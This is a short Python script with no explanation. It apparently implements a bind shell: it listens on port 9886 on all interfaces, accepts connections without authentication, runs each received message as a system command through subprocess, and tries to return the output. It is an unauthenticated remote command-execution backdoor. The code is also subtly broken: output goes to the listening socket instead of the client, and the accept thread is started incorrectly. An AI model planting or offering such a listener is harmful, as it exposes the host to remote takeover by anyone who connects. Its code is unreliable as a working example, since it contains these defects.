from socket import AF_INET, socket, SOCK_STREAM
from threading import Thread
import subprocess

addresses = {}
clients = {}

HOST = ''
PORT = 9886
BUFFSIZE = 1024
ADDR = (HOST, PORT)

SERVER = socket(AF_INET, SOCK_STREAM)
SERVER.bind(ADDR)


def handle_new_connection():
    while 1:
        client, client_address = SERVER.accept()
        print("%s:%s has connected." % client_address)
        addresses[client] = client_address
        Thread(target=handle_client, args=(client, )).start()


def handle_client(client):
    name = client.recv(BUFFSIZE).decode('utf8')
    clients[client] = name

    while 1:
        msg = client.recv(BUFFSIZE)
        out = subprocess.Popen(msg,
                               stdout=subprocess.PIPE,
                               stderr=subprocess.STDOUT)
        stdout, stderr = out.communicate()
        socket.send(self=SERVER, data=stdout)


if __name__ == "__main__":
    SERVER.listen(5)
    ACCEPT_THREAD = Thread(target=handle_new_connection())
    ACCEPT_THREAD.start()
    ACCEPT_THREAD.join()
    SERVER.close()
